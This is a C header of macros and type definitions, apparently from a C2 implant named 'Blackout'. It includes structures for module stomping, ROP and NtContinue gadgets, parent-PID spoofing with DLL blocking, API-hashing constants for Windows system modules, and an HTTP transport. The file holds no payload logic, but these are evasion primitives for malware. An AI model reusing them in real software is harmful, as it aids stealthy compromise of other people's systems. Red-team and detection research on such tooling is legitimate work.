#ifndef BLACKOUT_MACROS_H
#define BLACKOUT_MACROS_H

typedef struct _BUFFER {
    PVOID  Base;
    UINT64 Length;
} BUFFER, *PBUFFER;

typedef struct _STOMP {
    PVOID Backup;
    USTR  UsMod;
    PVOID ModBase;
} STOMP, *PSTOMP;

typedef struct _GADGET {
    PVOID JmpGadget;
    PVOID RetGadget;
    PVOID NtContinueGadget;
} GADGET, *PGADGET;

typedef struct _FORK {
    PSTR  Spawnto;
    DWORD Ppid;
    BOOL  Blockdlls;
    PWSTR Argue;            
} FORK, *PFORK;

//
// Hashing defines
//
#define H_MAGIC_KEY          5381
#define H_MAGIC_SEED         5
#define H_MODULE_NTDLL       0x70e61753
#define H_MODULE_KERNELBASE  0x6F1259F0
#define H_MODULE_KERNEL32    0xadd31df0

#define NtGetLastError() Instance()->Teb->LastErrorValue
#define RTL_CONSTANT_OBJECT_ATTRIBUTES(n, a) { sizeof(OBJECT_ATTRIBUTES), n, NULL, a, NULL, NULL }

// pseudo handles
#define NtCurrentProcess()              ( (HANDLE)(-1) )
#define NtCurrentThread()               ( (HANDLE)(-2) )
#define NtCurrentProcessToken()         ( (HANDLE)(-4) )
#define NtCurrentThreadToken()          ( (HANDLE)(-5) )
#define NtCurrentThreadEffectiveToken() ( (HANDLE)(-6) )

//
// instance related macros
//
#define InstanceOffset()  ( U_PTR( & __Instance_offset ) )
#define InstancePtr()     ( ( PINSTANCE ) C_DEF( C_PTR( U_PTR( StRipStart() ) + InstanceOffset() ) ) )
#define Instance()        ( ( PINSTANCE ) __LocalInstance )
#define Blackout()        ( ( ( PINSTANCE ) __LocalInstance )->Blackout )
#define Transport()       ( ( ( PINSTANCE ) __LocalInstance )->Transport )
#define BLACKOUT_INSTANCE PINSTANCE __LocalInstance = InstancePtr();

//
// utils macros
//
#define D_API( x )  __typeof__( x ) * x;
#define D_SEC( x )  __attribute__( ( section( ".text$" #x "" ) ) )
#define FUNC        D_SEC( B )
#define ST_GLOBAL   __attribute__( ( section( ".global" ) ) )
#define ST_READONLY __attribute__( ( section( ".rdata" ) ) )

#define PAGE_SIZE 0x1000 
#define BK_PACKAGE          InstancePtr()->Transport.Http.Package
#define BK_PRINT(fmt, ...)  InstancePtr()->Win32.printf(fmt, ##__VA_ARGS__)

//
// type castinng lenght 
//
#define C_8( x )   ( ( INT8 )   ( X ) )
#define C_16( x )  ( ( INT16 )  ( x ) )
#define C_32( x )  ( ( INT32 )  ( x ) )
#define C_64( x )  ( ( INT64 )  ( x ) )
#define C_U8( x )  ( ( UINT8 )  ( x ) )
#define C_U16( x ) ( ( UINT16 ) ( x ) )
#define C_U32( x ) ( ( UINT32 ) ( x ) )
#define C_U64( x ) ( ( UINT64 ) ( x ) )

//
// casting macros
//
#define C_PTR( x )   ( ( PVOID    ) ( x ) )
#define U_PTR( x )   ( ( UINT_PTR ) ( x ) )
#define B_PTR( x )   ( ( PBYTE    ) ( x ) )
#define U_PTR32( x ) ( ( ULONG    ) ( x ) )
#define U_PTR64( x ) ( ( ULONG64  ) ( x ) )
#define A_PTR( x )   ( ( PCHAR    ) ( x ) )
#define W_PTR( x )   ( ( PWCHAR   ) ( x ) )

//
// dereference memory macros
//
#define C_DEF( x )   ( * ( PVOID* )  ( x ) )
#define C_DEF08( x ) ( * ( UINT8*  ) ( x ) )
#define C_DEF16( x ) ( * ( UINT16* ) ( x ) )
#define C_DEF32( x ) ( * ( UINT32* ) ( x ) )
#define C_DEF64( x ) ( * ( UINT64* ) ( x ) )

//
// memory related macros
//
#define MmCopy __builtin_memcpy
#define MmSet  __stosb
#define MmZero RtlSecureZeroMemory

/* Clion IDE hacks */
#ifdef  __cplusplus
#define CONSTEXPR         constexpr
#define TEMPLATE_TYPENAME template <typename T>
#define INLINE            inline
#else
#define CONSTEXPR
#define TEMPLATE_TYPENAME
#define INLINE
#endif

#endif //BLACKOUT_MACROS_H
